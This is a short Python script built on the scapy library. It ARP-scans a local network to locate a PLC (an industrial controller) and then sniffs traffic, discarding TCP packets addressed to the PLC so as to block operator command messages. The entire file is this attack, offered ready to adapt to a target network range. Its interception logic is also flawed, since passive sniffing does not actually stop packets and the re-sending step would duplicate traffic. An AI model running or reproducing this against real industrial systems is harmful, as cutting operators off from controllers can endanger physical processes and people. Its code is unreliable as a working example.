from scapy.all import *
import ipaddress
import time

# Function to scan the network and find the PLC's IP address
def find_plc_ip(network):
    print("Scanning network to find PLC's IP address...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=False)
    for snd, rcv in ans:
        print(f"Found device: {rcv.psrc} - {rcv.hwsrc}")
        if is_plc(rcv.psrc):
            return rcv.psrc
    return None

# Function to determine if an IP address belongs to the PLC
def is_plc(ip):
    # Placeholder function: Replace with actual logic to identify the PLC
    # For example, you can check the MAC address or use a known PLC IP range
    return ip == "192.168.1.100"  # Replace with the actual PLC IP or MAC address

# Function to block command messages to the PLC
def block_command_messages(plc_ip):
    print(f"Blocking command messages to PLC at {plc_ip}...")
    def packet_callback(packet):
        if packet.haslayer(IP) and packet[IP].dst == plc_ip and packet.haslayer(TCP):
            print(f"Blocked command message to {plc_ip}")
            return
        sendp(packet, verbose=False)

    sniff(filter="ip", prn=packet_callback, store=0)

# Main function
def main():
    network = "192.168.1.0/24"  # Replace with your network range
    plc_ip = find_plc_ip(network)
    
    if plc_ip:
        block_command_messages(plc_ip)
    else:
        print("PLC not found in the network.")

if __name__ == "__main__":
    main()